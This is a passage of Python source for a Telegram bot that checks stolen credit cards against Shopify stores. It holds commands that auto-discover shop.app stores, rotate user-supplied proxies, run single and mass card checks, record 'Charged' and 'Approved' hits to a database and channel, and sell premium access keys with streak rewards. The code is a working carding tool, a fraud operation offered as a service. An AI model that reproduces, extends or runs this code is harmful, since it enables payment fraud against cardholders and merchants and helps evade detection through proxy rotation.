        try:
            await send_entities(user_id, pe(
                f"🔥 <b>{bs('Streak Milestone!')}</b>\n{SEP}\n"
                f"📅 <b>{bs('Day')} {r['day']}</b> {bs('streak unlocked')}\n"
                f"🎁 <b>+{r['hours']}h Premium</b> {bs('added')}\n"
                f"🔥 {bs('Current streak')}: <code>{info['current']}</code>\n"
                f"🏆 {bs('Best')}: <code>{info['best']}</code>"))
        except Exception:
            pass
    except Exception as e:
        log_system("STREAK", f"update error: {e}", "error")


# =============================================================================
# COMMAND HANDLERS
# =============================================================================

# ====================== PROXY ======================
@client.on(events.NewMessage(pattern=r'^[/.]addproxy$'))
async def cmd_addproxy(event):
    uid = event.sender_id
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    await ensure_user(uid)
    if uid not in ADMIN_ID and not await is_premium(uid):
        return await send_premium_only(event)

    lines = []
    if event.reply_to_msg_id:
        reply = await event.get_reply_message()
        if reply and reply.file:
            try:
                path = await reply.download_media()
                async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = [ln.strip() for ln in (await f.read()).splitlines() if ln.strip()]
                os.remove(path)
            except Exception as e:
                return await styled_reply(event, pe(f"💎 <b>{bs('File error')}</b>: <code>{e}</code>"))
        elif reply and reply.text:
            lines = [ln.strip() for ln in reply.text.splitlines() if ln.strip()]
    else:
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) == 2:
            lines = [ln.strip() for ln in parts[1].splitlines() if ln.strip()]

    if not lines:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Add proxies')}</b>\n{SEP}\n"
            f"💎 <i>Send one per line:</i>\n"
            f"<code>• /addproxy\nUS:ip:port:user:pass\nip:port</code>"))

    current_count = await get_proxy_count(uid)
    if current_count >= MAX_PROXIES_PER_USER:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Proxy limit')}</b> <code>{current_count}/{MAX_PROXIES_PER_USER}</code>"))

    # Dedup against existing
    existing_docs = await get_all_user_proxies(uid)
    existing = set()
    for d in existing_docs:
        raw = d.get("proxy_url") or ""
        if not raw:
            ip, port = d.get("ip"), d.get("port")
            u_, pw_ = d.get("username"), d.get("password")
            raw = f"{ip}:{port}:{u_}:{pw_}" if u_ and pw_ else f"{ip}:{port}"
        existing.add(raw)

    to_check, dups = [], 0
    for raw in lines:
        clean = _strip_country_from_proxy(raw)
        parsed = parse_proxy_format(clean)
        if not parsed:
            continue
        if parsed['username'] and parsed['password']:
            norm = f"{parsed['ip']}:{parsed['port']}:{parsed['username']}:{parsed['password']}"
        else:
            norm = f"{parsed['ip']}:{parsed['port']}"
        if norm in existing:
            dups += 1
            continue
        to_check.append(raw)
        existing.add(norm)

    if not to_check:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('No new proxies')}</b>\n"
            f"💎 {bs('Duplicates')}: <code>{dups}</code>"))

    slots = MAX_PROXIES_PER_USER - current_count
    to_check = to_check[:slots]
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Checking')} <code>{len(to_check)}</code>..."))
    sem = get_user_sem(uid, "proxy")
    alive, dead = [], []
    checked = 0

    async def _check_one(p):
        nonlocal checked
        clean = _strip_country_from_proxy(p)
        async with sem:
            res = await test_proxy(clean)
        checked += 1
        if res['status'] == 'alive':
            alive.append(p)
        else:
            dead.append(p)
        if checked % 10 == 0 or checked == len(to_check):
            try:
                await status_msg.edit(pe(
                    f"💎 <b>{bs('Checking')}</b> [{checked}/{len(to_check)}]\n"
                    f"✅ <code>{len(alive)}</code> | ❌ <code>{len(dead)}</code>"),
                    parse_mode='html', link_preview=False)
            except Exception:
                pass

    try:
        for i in range(0, len(to_check), PROXY_PER_USER_WORKERS):
            batch = to_check[i:i + PROXY_PER_USER_WORKERS]
            await asyncio.gather(*[_check_one(p) for p in batch])
        added = 0
        for raw in alive:
            clean = _strip_country_from_proxy(raw)
            parsed = parse_proxy_format(clean)
            if not parsed:
                continue
            await add_proxy_db(uid, parsed)
            added += 1
        total_now = await get_proxy_count(uid)
        await status_msg.edit(pe(
            f"✅ <b>{bs('Proxy check complete')}</b>\n{SEP}\n"
            f"✅ {bs('Alive (added)')}: <code>{added}</code>\n"
            f"❌ {bs('Dead (ignored)')}: <code>{len(dead)}</code>\n"
            f"📁 {bs('Total')}: <code>{total_now}/{MAX_PROXIES_PER_USER}</code>"),
            parse_mode='html', link_preview=False)
    finally:
        cleanup_user_sem(uid)


@client.on(events.NewMessage(pattern=r'^[/.]proxy$'))
async def cmd_proxy(event):
    uid = event.sender_id
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    await ensure_user(uid)
    if uid not in ADMIN_ID and not await is_premium(uid):
        return await send_premium_only(event)
    proxies = await load_user_proxies_async(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b> — <code>• /addproxy</code>"))
    status_msg = await styled_reply(event, pe(f"💎 {bs('Checking')} <code>{len(proxies)}</code>..."))
    sem = get_user_sem(uid, "proxy")
    alive, dead, checked = [], [], 0

    async def _one(p):
        nonlocal checked
        clean = _strip_country_from_proxy(p)
        async with sem:
            res = await test_proxy(clean)
        checked += 1
        (alive if res['status'] == 'alive' else dead).append(p)
        if checked % 10 == 0 or checked == len(proxies):
            try:
                await status_msg.edit(pe(
                    f"💎 <b>{bs('Checking')}</b> [{checked}/{len(proxies)}]\n"
                    f"✅ <code>{len(alive)}</code> | ❌ <code>{len(dead)}</code>"),
                    parse_mode='html', link_preview=False)
            except Exception:
                pass

    try:
        for i in range(0, len(proxies), PROXY_PER_USER_WORKERS):
            batch = proxies[i:i + PROXY_PER_USER_WORKERS]
            await asyncio.gather(*[_one(p) for p in batch])
        # Replace in Mongo: clear then re-add alive
        await clear_all_proxies(uid)
        for raw in alive:
            clean = _strip_country_from_proxy(raw)
            parsed = parse_proxy_format(clean)
            if parsed:
                await add_proxy_db(uid, parsed)
        await status_msg.edit(pe(
            f"✅ <b>{bs('Proxy check complete')}</b>\n{SEP}\n"
            f"📁 {bs('Total')}: <code>{len(proxies)}</code>\n"
            f"✅ {bs('Alive')}: <code>{len(alive)}</code>\n"
            f"🗑 {bs('Removed dead')}: <code>{len(dead)}</code>"),
            parse_mode='html', link_preview=False)
    finally:
        cleanup_user_sem(uid)


@client.on(events.NewMessage(pattern=r'^[/.]myproxy$'))
async def cmd_myproxy(event):
    uid = event.sender_id
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    await ensure_user(uid)
    if uid not in ADMIN_ID and not await is_premium(uid):
        return await send_premium_only(event)
    proxies = await load_user_proxies_async(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b> — <code>• /addproxy</code>"))
    lines = [f"{i}. <code>{p}</code>" for i, p in enumerate(proxies[:50], 1)]
    if len(proxies) > 50:
        lines.append(f"<i>+{len(proxies)-50} more</i>")
    await styled_reply(event, pe(
        f"💎 <b>{bs('Your proxies')}</b> (<code>{len(proxies)}/{MAX_PROXIES_PER_USER}</code>)\n"
        f"{SEP}\n" + "\n".join(lines)))


@client.on(events.NewMessage(pattern=r'^[/.]clearproxy$'))
async def cmd_clearproxy(event):
    uid = event.sender_id
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    await ensure_user(uid)
    if uid not in ADMIN_ID and not await is_premium(uid):
        return await send_premium_only(event)
    n = await clear_all_proxies(uid)
    if n == 0:
        return await styled_reply(event, pe(f"💎 <b>{bs('Already empty')}</b>"))
    await styled_reply(event, pe(f"✅ <b>{bs('Cleared')}</b> <code>{n}</code>"))


# ====================== AUTO SEARCH ======================
@client.on(events.NewMessage(pattern=r'^[/.]fetchstores(?:\s+(\d+))?(?:\s+(.+))?$'))
async def cmd_fetchstores(event):
    uid = event.sender_id
    if uid not in ADMIN_ID: return
    if not ENGINE_OK:
        return await styled_reply(event, pe(f"💎 <b>{bs('Engine missing')}</b>: <code>{_ENGINE_ERR}</code>"))
    m = event.pattern_match
    want = int(m.group(1)) if m.group(1) else 200
    want = max(20, min(want, 2000))
    keyword = (m.group(2) or "").strip()
    status_msg = await styled_reply(event, pe(
        f"🔍 <b>{bs('Searching shop.app')}</b>\n{SEP}\n"
        f"🎯 {bs('Target')}: <code>{want}</code>"
        + (f" · kw: <code>{keyword}</code>" if keyword else "")))

    try:
        results = await discover_shopify_stores_async(keyword=keyword, want=want)
    except Exception as e:
        return await styled_edit(status_msg, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))

    if not results:
        return await styled_edit(status_msg, pe(f"💎 <b>{bs('No stores found')}</b>"))

    seen_hosts = set()
    clean = []
    for r in results:
        host = normalize_site_url(r["site"])
        if not host or host in seen_hosts:
            continue
        seen_hosts.add(host)
        clean.append(host)

    existing = set(await load_sites_async())
    new = [s for s in clean if s not in existing]
    added = await add_sites_bulk(new)

    total = len(await load_sites_async())
    await styled_edit(status_msg, pe(
        f"✅ <b>{bs('Stores discovered')}</b>\n{SEP}\n"
        f"📥 {bs('Found')}: <code>{len(clean)}</code>\n"
        f"➕ {bs('New')}: <code>{added}</code>\n"
        f"📁 {bs('Total sites')}: <code>{total}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]auto\s+'))
async def cmd_auto(event):
    uid = event.sender_id
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    await ensure_user(uid)
    if uid not in ADMIN_ID and not await is_premium(uid):
        return await send_premium_only(event)
    if not ENGINE_OK:
        return await styled_reply(event, pe(f"💎 <b>{bs('Engine missing')}</b>: <code>{_ENGINE_ERR}</code>"))

    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Syntax')}</b>\n└─ <code>• /auto card|mm|yy|cvv [keyword]</code>"))
    body = parts[1].strip()
    cards = extract_cc(body)
    if not cards:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid card')}</b>"))
    card = cards[0]
    keyword = ""
    m2 = re.search(re.escape(card.split('|')[0]) + r".*?\|.*?\|.*?\|.*?\s+(\S.*)$", body)
    if m2:
        keyword = m2.group(1).strip()

    proxies = await load_user_proxies_async(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b> — /addproxy"))

    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
        name = sender.first_name or username
    except Exception:
        username, name = f"user_{uid}", "User"

    status_msg = await styled_reply(event, pe(
        f"🚀 <b>{bs('AUTO MODE')}</b>\n{SEP}\n"
        f"🔍 {bs('Discovering stores...')}"))

    try:
        results = await discover_shopify_stores_async(keyword=keyword, want=60)
    except Exception as e:
        return await styled_edit(status_msg, pe(f"💎 <b>{bs('Discovery error')}</b>: <code>{e}</code>"))
    if not results:
        return await styled_edit(status_msg, pe(f"💎 <b>{bs('No stores found')}</b>"))

    sites = []
    seen = set()
    for r in results:
        h = normalize_site_url(r["site"])
        if h and h not in seen:
            seen.add(h); sites.append(h)
    sites = sites[:40]

    await styled_edit(status_msg, pe(
        f"🚀 <b>{bs('AUTO MODE')}</b>\n{SEP}\n"
        f"🔍 {bs('Found')}: <code>{len(sites)}</code>\n"
        f"🎯 {bs('Checking')} <code>{card}</code>..."))

    st = time.time()
    sem = get_user_sem(uid, "sp")

    async def _one(site):
        async with sem:
            result, _ = await check_card_direct(card, site, random.choice(proxies))
        return site, result

    tasks = [asyncio.create_task(_one(s)) for s in sites]
    charged_results = []
    approved_results = []
    try:
        for coro in asyncio.as_completed(tasks):
            try:
                site, res = await coro
            except Exception:
                continue
            status = res.get('status', 'Dead')
            _site_report(site, status)
            if status == 'Charged':
                charged_results.append(res)
                await _consume_free(uid)
                if uid not in ADMIN_ID and await is_premium(uid):
                    inc_premium_daily_used(uid)
                increment_charge_count(uid)
                asyncio.create_task(_process_milestone_payout(uid))
                asyncio.create_task(_process_streak_update(uid))
                asyncio.create_task(save_card_to_db(card, 'CHARGED',
                                                     res.get('message', ''),
                                                     'Shopify',
                                                     res.get('price', '-')))
                try:
                    await send_realtime_hit(uid, res)
                except Exception:
                    pass
                asyncio.create_task(send_hit_to_channel(
                    card, status, res.get('message', ''), 'Shopify',
                    res.get('price', '-'), user_mention=f"@{username}",
                    user_id=uid, site=site))
                break
            elif status == 'Approved':
                approved_results.append(res)
                asyncio.create_task(save_card_to_db(card, 'APPROVED',
                                                     res.get('message', ''),
                                                     'Shopify',
                                                     res.get('price', '-')))
    finally:
        for t in tasks:
            if not t.done():
                t.cancel()

    elapsed = time.time() - st
    if charged_results or approved_results:
        best = charged_results[0] if charged_results else approved_results[0]
        bin_tuple = await get_bin_info(card.split('|')[0])
        await styled_edit(status_msg, format_single(best, bin_tuple, elapsed),
                          parse_mode='html')
    else:
        await styled_edit(status_msg, pe(
            f"🥔 <b>{bs('No hits')}</b>\n{SEP}\n"
            f"🌐 {bs('Tested')}: <code>{len(sites)}</code>\n"
            f"⏱ {bs('Took')}: <code>{elapsed:.1f}s</code>"))


# ====================== SITES ======================
@client.on(events.NewMessage(pattern=r'^[/.]sites$'))
async def cmd_sites(event):
    uid = event.sender_id
    if uid not in ADMIN_ID: return
    sites = await load_sites_async()
    if not sites:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('No sites')}</b> — <code>• /fetchstores</code>"))
    lines = [f"{i}. <code>{s}</code>" for i, s in enumerate(sites[:40], 1)]
    if len(sites) > 40:
        lines.append(f"<i>+{len(sites)-40} more</i>")
    await styled_reply(event, pe(
        f"🌐 <b>{bs('Global sites')}</b> (<code>{len(sites)}</code>)\n{SEP}\n" + "\n".join(lines)))


@client.on(events.NewMessage(pattern=r'^[/.]site$'))
async def cmd_site(event):
    uid = event.sender_id
    if uid not in ADMIN_ID: return
    sites = await load_sites_async()
    if not sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('No sites')}</b>"))
    proxies = await load_user_proxies_async(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b>"))

    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Testing')} <code>{len(sites)}</code>..."))
    sem = get_user_sem(uid, "site")
    dead = []
    checked = 0
    lock = asyncio.Lock()

    async def _one(site):
        nonlocal checked
        proxy = random.choice(proxies)
        clean = _strip_country_from_proxy(proxy)
        try:
            proxy_url = proxy_to_url(clean)
        except Exception:
            proxy_url = ""
        ok = False
        try:
            s = await get_http_session()
            url = f"https://{normalize_site_url(site)}/products.json?limit=5"
            kw = {"timeout": aiohttp.ClientTimeout(total=10, connect=6)}
            if proxy_url: kw["proxy"] = proxy_url
            async with s.get(url, **kw) as r:
                if r.status == 200:
                    body = await r.text()
                    if '"products"' in body:
                        ok = True
        except Exception:
            ok = False
        async with lock:
            checked += 1
            if not ok:
                dead.append(site)
            if checked % 10 == 0 or checked == len(sites):
                try:
                    await status_msg.edit(pe(
                        f"💎 <b>{bs('Testing')}</b> [{checked}/{len(sites)}]\n"
                        f"✅ <code>{checked - len(dead)}</code> | ❌ <code>{len(dead)}</code>"),
                        parse_mode='html', link_preview=False)
                except Exception:
                    pass

    for i in range(0, len(sites), SITE_PER_USER_WORKERS):
        batch = sites[i:i + SITE_PER_USER_WORKERS]
        await asyncio.gather(*[_one(s) for s in batch])

    for s in dead:
        await remove_global_site(s)
    await status_msg.edit(pe(
        f"✅ <b>{bs('Site check complete')}</b>\n{SEP}\n"
        f"📁 {bs('Total')}: <code>{len(sites)}</code>\n"
        f"✅ {bs('Alive')}: <code>{len(sites) - len(dead)}</code>\n"
        f"🗑 {bs('Removed dead')}: <code>{len(dead)}</code>"),
        parse_mode='html', link_preview=False)


# ====================== /sh ======================
@client.on(events.NewMessage(pattern=r'^[/.]sh\s+'))
async def cmd_sh(event):
    uid = event.sender_id
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    await ensure_user(uid)
    if not await _check_free_or_premium(event, uid): return
    if uid not in ADMIN_ID and await is_premium(uid):
        ulimit = get_premium_daily_limit(uid)
        if ulimit > 0:
            used = get_premium_daily_used(uid)
            if used >= ulimit:
                return await styled_reply(event, pe(
                    f"⚠️ <b>{bs('Daily limit reached')}</b>\n{SEP}\n"
                    f"Used: <code>{used}/{ulimit}</code>"))
    if not ENGINE_OK:
        return await styled_reply(event, pe(f"💎 <b>{bs('Engine missing')}</b>: <code>{_ENGINE_ERR}</code>"))

    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Syntax')}</b>\n└─ <code>• /sh card|mm|yy|ccv</code>"))
    cards = extract_cc(parts[1])
    if not cards:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid card')}</b>"))
    card = cards[0]

    sites = await load_sites_async()
    if not sites:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('No sites')}</b>\n"
            f"💡 {bs('Use')} <code>• /auto {card}</code>"))
    proxies = await load_user_proxies_async(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b> — /addproxy"))

    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
        name = sender.first_name or username
    except Exception:
        username, name = f"user_{uid}", "User"

    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Checking')} <code>{card}</code>..."))
    st = time.time()
    rotator = SmartRotator()
    sem = get_user_sem(uid, "sp")

    try:
        async with sem:
            result, proxy_used = await check_card_with_retry(
                card, sites, proxies, max_retries=2, rotator=rotator)
        elapsed = time.time() - st
        bin_tuple = await get_bin_info(card.split('|')[0])
        text = format_single(result, bin_tuple, elapsed)
        status = result.get('status', 'Dead')
        await _consume_free(uid)
        if uid not in ADMIN_ID and await is_premium(uid):
            inc_premium_daily_used(uid)

        if status in ("Charged", "Approved"):
            if status == "Charged":
                increment_charge_count(uid)
                asyncio.create_task(_process_milestone_payout(uid))
                asyncio.create_task(_process_streak_update(uid))
            asyncio.create_task(save_card_to_db(card, status.upper(),
                                                 result.get('message', ''),
                                                 'Shopify',
                                                 result.get('price', '-')))
            video_path = _pick_hit_video()
            try:
                await status_msg.delete()
            except Exception:
                pass
            await styled_reply(event, text, buttons=HIT_BUTTON)
            asyncio.create_task(send_realtime_hit(uid, result, video_path=video_path))
            asyncio.create_task(send_hit_to_channel(
                card, status, result.get('message', ''),
                result.get('gateway', 'Shopify'),
                result.get('price', '-'),
                user_mention=f"@{username}" if username else name,
                user_id=uid, site=result.get('site'),
                proxy_used=proxy_used, video_path=video_path))
        else:
            await edit_entities(status_msg, text, buttons=HIT_BUTTON)
    except Exception as e:
        try:
            await status_msg.edit(pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"),
                                   parse_mode='html')
        except Exception:
            pass
    finally:
        cleanup_user_sem(uid)


# ====================== MASS /msh ======================
async def start_mass_shopify(user_id, cards, event, status_msg):
    sites = await load_sites_async()
    if not sites:
        await styled_edit(status_msg, pe(f"💎 <b>{bs('No sites')}</b>"))
        return
    proxies = await load_user_proxies_async(user_id)
    if not proxies:
        await styled_edit(status_msg, pe(f"💎 <b>{bs('No proxies')}</b> — /addproxy"))
        return
    try:
        sender = await client_instance.get_entity(user_id)
        username = sender.username or f"user_{user_id}"
        name = sender.first_name or username
    except Exception:
        username, name = f"user_{user_id}", "User"

    session_key = f"{user_id}_{status_msg.id}"
    ACTIVE_SESSIONS[session_key] = {"stopped": False}
    results = {"charged": [], "approved": [], "dead": [], "errors": [],
                "total": len(cards), "checked": 0, "start_time": time.time(),
                "last_card": "", "last_response": "", "last_price": "-"}
    user_sem = get_user_sem(user_id, "msp")
    rotator = SmartRotator()
    queue = asyncio.Queue()
    for c in cards:
        queue.put_nowait(c)
    last_ui = [time.time()]
    cached_sites = sites
    cached_proxies = proxies
    last_refresh = [0]

    def _stop():
        s = ACTIVE_SESSIONS.get(session_key)
        return not s or s.get("stopped", False)

    async def worker():
        while not queue.empty():
            if _stop(): return
            try:
                card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
            async with user_sem:
                if results['checked'] - last_refresh[0] >= 30:
                    cached_sites = await load_sites_async()
                    cached_proxies = await load_user_proxies_async(user_id)
                    last_refresh[0] = results['checked']
                if not cached_sites or not cached_proxies:
                    break
                result, proxy_used = await check_card_with_retry(
                    card, cached_sites, cached_proxies, max_retries=2, rotator=rotator)
            if _stop(): return
            results['checked'] += 1
            results['last_card'] = card
            results['last_response'] = (result.get('message') or '')[:50]
            results['last_price'] = result.get('price', '-')
            status = result.get('status', 'Dead')
            if status in ('Charged', 'Approved'):
                video_path = _pick_hit_video()
                if status == 'Charged':
                    results['charged'].append(result)
                    increment_charge_count(user_id)
                    asyncio.create_task(_process_milestone_payout(user_id))
                    asyncio.create_task(_process_streak_update(user_id))
                else:
                    results['approved'].append(result)
                asyncio.create_task(save_card_to_db(card, status.upper(),
                                                     result.get('message', ''),
                                                     'Shopify',
                                                     result.get('price', '-')))
                asyncio.create_task(send_realtime_hit(user_id, result, video_path=video_path))
                asyncio.create_task(send_hit_to_channel(
                    card, status, result.get('message', ''),
                    result.get('gateway', 'Shopify'),
                    result.get('price', '-'),
                    user_mention=f"@{username}" if username else name,
                    user_id=user_id, site=result.get('site'),
                    proxy_used=proxy_used, video_path=video_path))
            elif status == 'Error':
                results['errors'].append(result)
            else:
                results['dead'].append(result)
            queue.task_done()
            await asyncio.sleep(0)
            if time.time() - last_ui[0] >= 2.0:
                last_ui[0] = time.time()
                if session_key in ACTIVE_SESSIONS:
                    try:
                        await update_progress(user_id, status_msg.id, results)
                    except Exception:
                        pass

    workers = [asyncio.create_task(worker()) for _ in range(MSP_PER_USER_WORKERS)]
    try:
        await asyncio.gather(*workers, return_exceptions=True)
    finally:
        try:
            await update_progress(user_id, status_msg.id, results)
        except Exception:
            pass
        try:
            await status_msg.delete()
        except Exception:
            pass
        SHOPIFY_RESULTS[user_id] = results
        await send_final_results(user_id, results)
        ACTIVE_SESSIONS.pop(session_key, None)
        cleanup_user_sem(user_id)


@client.on(events.NewMessage(pattern=r'^[/.]msh$'))
async def cmd_msh(event):
    uid = event.sender_id
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    await ensure_user(uid)
    if uid not in ADMIN_ID and not await is_premium(uid):
        return await send_premium_only(event)
    if not ENGINE_OK:
        return await styled_reply(event, pe(f"💎 <b>{bs('Engine missing')}</b>: <code>{_ENGINE_ERR}</code>"))
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(
            f"💎 {bs('Reply to a .txt file with')} <code>• /msh</code>"))
    reply = await event.get_reply_message()
    if not reply or not reply.file:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file')}"))
    try:
        path = await reply.download_media()
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(path)
    except Exception as e:
        return await styled_reply(event, pe(f"💎 <b>{bs('File error')}</b>: <code>{e}</code>"))
    cards = extract_cc(content)
    if not cards:
        return await styled_reply(event, pe(f"💎 <b>{bs('No cards in file')}</b>"))
    HARD_CAP = MASS_HARD_CAP_ADMIN if uid in ADMIN_ID else MASS_HARD_CAP_PREMIUM
    user_limit = await get_user_cc_limit(uid)
    limit = min(user_limit or HARD_CAP, HARD_CAP)
    if len(cards) > limit:
        cards = cards[:limit]
        await styled_reply(event, pe(
            f"⚠️ <b>{bs('File trimmed')}</b>\n{SEP}\n"
            f"📋 {bs('Limit')}: <code>{limit}</code>"))
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Starting mass check')} <code>{len(cards)}</code>..."))
    asyncio.create_task(start_mass_shopify(uid, cards, event, status_msg))


# ====================== PROGRESS + RESULTS ======================
def _fmt_eta(sec):
    if sec <= 0 or sec > 86400:
        return "—"
    sec = int(sec)
    h, m, s = sec // 3600, (sec % 3600) // 60, sec % 60
    if h: return f"{h}h {m:02d}m"
    if m: return f"{m}m {s:02d}s"
    return f"{s}s"


def _build_bar(pct, length=16):
    pct = max(0, min(100, pct))
    filled = int(round(length * pct / 100))
    return "▰" * filled + "▱" * (length - filled)


async def update_progress(user_id, message_id, results):
    total = results.get('total', 1) or 1
    checked = results.get('checked', 0)
    remaining = max(total - checked, 0)
    elapsed = max(0.0, time.time() - results.get('start_time', time.time()))
    h, m, s = int(elapsed) // 3600, (int(elapsed) % 3600) // 60, int(elapsed) % 60
    pct = int((checked / total) * 100) if total else 0
    bar = _build_bar(pct, 16)
    n_charged = len(results.get('charged', []))
    n_approved = len(results.get('approved', []))
    n_dead = len(results.get('dead', []))
    n_errors = len(results.get('errors', []))
    hits = n_charged + n_approved
    hit_rate = (hits / checked * 100.0) if checked > 0 else 0.0
    eta_str = "done" if remaining == 0 else (_fmt_eta((remaining / (checked/elapsed)) if checked and elapsed else 0) if checked else "—")
    cps = (checked / elapsed) if elapsed > 0 else 0.0

    text = pe(f"""💳 {bs('Card')}: <code>{results.get('last_card') or '-'}</code>
📝 {bs('Response')}: <code>{(results.get('last_response') or '...')[:22]}</code>
{SEP}
{bar}  <b>{pct}%</b>
{SEP}
🥇 {bs('Charged')}: {n_charged}   🥈 {bs('Approved')}: {n_approved}
🥔 {bs('Declined')}: {n_dead}   🧨 {bs('Errors')}: {n_errors}
{SEP}
📊 {checked}/{total}  ━  ⏳ {bs('Left')}: {remaining}
🎯 {bs('Hit-rate')}: <b>{hit_rate:.2f}%</b>  ━  ⚡ {cps:.1f}/s
⏱️ {h:02d}:{m:02d}:{s:02d}  ━  🕐 {bs('ETA')}: {eta_str}
""")
    buttons = [[pbtn(bs("⛔ Stop"), data=f"stop_{user_id}", style="danger", icon="⛔")]]
    try:
        text_clean, ents = build_entities(text)
        await client_instance.edit_message(user_id, message_id, text_clean,
                                            formatting_entities=ents,
                                            buttons=buttons, link_preview=False)
    except Exception:
        pass


def _write_result_file(fname, title, items):
    try:
        with open(fname, 'w', encoding='utf-8') as f:
            f.write(f"{title}\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total    : {len(items)}\n")
            f.write("=" * 50 + "\n\n")
            if not items:
                f.write("(no cards in this category)\n")
            else:
                for i, item in enumerate(items, 1):
                    f.write(f"[{i:>4}] {item.get('card', '-')}\n")
                    f.write(f"        Response : {(item.get('message') or '')[:120]}\n")
                    f.write(f"        Gateway  : {item.get('gateway', 'Shopify')}\n")
                    f.write(f"        Price    : {item.get('price', '-')}\n")
                    f.write(f"        Site     : {item.get('site', '-')}\n")
                    f.write("-" * 40 + "\n")
    except Exception as e:
        log_system("EXPORT", f"write {fname}: {e}", "error")


async def send_final_results(user_id, results):
    elapsed = int(time.time() - results.get('start_time', time.time()))
    h, m, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    time_fmt = f"{h}h {m}m {s}s" if h else f"{m}m {s}s" if m else f"{s}s"

    charged = results.get('charged', [])
    approved = results.get('approved', [])
    dead = results.get('dead', [])
    errors = results.get('errors', [])
    total = results.get('total', 0) or 1
    hit_rate = ((len(charged) + len(approved)) / total * 100.0) if total else 0.0

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    summary = pe(f"""✅ <b>{bs('Check Complete')}</b>
{SEP}
📊 <b>{bs('Results')}</b>:
   ┣ 🥇 {bs('Charged')}:  {len(charged)}
   ┣ 🥈 {bs('Approved')}: {len(approved)}
   ┣ 🥔 {bs('Declined')}: {len(dead)}
   ┣ 🧨 {bs('Errors')}:   {len(errors)}
   ┗ 📊 {bs('Total')}:    {results.get('total', 0)}
{SEP}
🎯 {bs('Hit-rate')}: <b>{hit_rate:.2f}%</b>
⏱️ {bs('Time')}: {time_fmt}
{SEP}
📁 {bs('3 files below')} ⬇️""")
    try:
        await send_entities(user_id, summary)
    except Exception:
        pass

    categories = [("CHARGED", charged, "🥇"), ("APPROVED", approved, "🥈"),
                   ("ALL", charged + approved + dead + errors, "📁")]
    for cat_name, items, emoji in categories:
        fname = f"NOVA_{cat_name}_{user_id}_{ts}.txt"
        _write_result_file(fname, f"{cat_name} CARDS", items)
        try:
            await send_file_entities(user_id, fname,
                pe(f"{emoji} <b>{bs(cat_name)}</b> — <code>{len(items)}</code>"))
        except Exception:
            pass
        try:
            os.remove(fname)
        except Exception:
            pass


@client.on(events.CallbackQuery(pattern=rb"^stop_(\d+)$"))
async def cb_stop(event):
    uid = int(event.pattern_match.group(1).decode())
    if event.sender_id != uid and event.sender_id not in ADMIN_ID:
        return await event.answer("Not yours!", alert=True)
    stopped = 0
    for key in list(ACTIVE_SESSIONS.keys()):
        if key.startswith(f"{uid}_"):
            ACTIVE_SESSIONS[key]["stopped"] = True
            stopped += 1
    await event.answer(f"Stopped {stopped}", alert=True)


# ====================== KEYS ======================
@client.on(events.NewMessage(pattern=r'^[/.]genkeys\s+'))
async def cmd_genkeys(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 5:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Usage')}</b>\n"
            f"<code>• /genkeys count hours max_users cc_limit [price]</code>"))
    try:
        count = int(parts[1]); hours = int(parts[2])
        max_users = int(parts[3]); cc_limit = int(parts[4])
        price = float(parts[5]) if len(parts) > 5 else 0.0
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid numbers')}</b>"))
    if count < 1 or count > 100:
        return await styled_reply(event, pe(f"💎 <b>{bs('Count 1-100')}</b>"))
    kd = load_keys(); now = datetime.now()
    expiry = (now + timedelta(hours=hours)).isoformat()
    gen = []
    for _ in range(count):
        k = generate_key()
        while k in kd:
            k = generate_key()
        kd[k] = {"hours": hours, "max_users": max_users, "cc_limit": cc_limit,
                 "price": price, "created_at": now.isoformat(),
                 "created_by": event.sender_id, "expiry": expiry,
                 "used_by": [], "used_count": 0}
        gen.append(k)
    save_keys(kd)
    hours_disp = f"{hours}h" if hours < 24 else f"{hours // 24}d"
